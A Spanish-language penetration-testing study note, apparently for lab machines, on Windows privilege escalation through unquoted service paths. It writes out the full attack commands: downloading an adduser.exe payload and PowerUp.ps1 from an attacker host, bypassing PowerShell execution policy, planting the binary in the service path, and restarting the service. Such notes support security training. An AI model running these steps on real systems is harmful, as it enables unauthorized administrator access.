
## DESCRIPTION

Se basa en encontrar un servicio ejecutado por administrador que se encuentra en una ubicación en la que tenemos permisos para escribir y que no tiene comillas:
![[Pasted image 20230523181427.png]]

#### Mas información
* https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/#:~:text=When%20a%20service%20is%20created,of%20the%20time%20it%20is).


## EXPLOITATION

### OPTION 1: MANUAL

1. Buscamos un servicio vulnerable, winpeas tambien sirve:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```

2. Comprobamos que podemos parar/arrancar ese ervicio y que se encuentra en una ruta sin comillas:


3. Comprobamos los permisos(vemos que tiene scritura en uno de ellos)


4. Creamos un ejecutable y lo trasferiamos a la maquina con el mismo nombre que el de la ruta con espacio, en este caso Current.exe

```
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

5. Reseteamos el servicio:

```
Start-Service GammaService
```

### OPTION 2: USING POWERUP

1. Subimos powerup a la maquina vicitma
```
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```

2. Ejecutamos
```
powershell -ep bypass

. .\PowerUp.ps1

Get-UnquotedService

OPCION 1: Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

# Tambien podemos copiarlo directamente, por ejemplo:

OPCION 2: copy Surveillance.exe "C:\Enterprise Software\Monitoring Solution\Surveillance.exe"


# Reseteamos el servivio y bingo
Restart-Service ReynhSurveillance

```

![[Pasted image 20230523185305.png]]

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 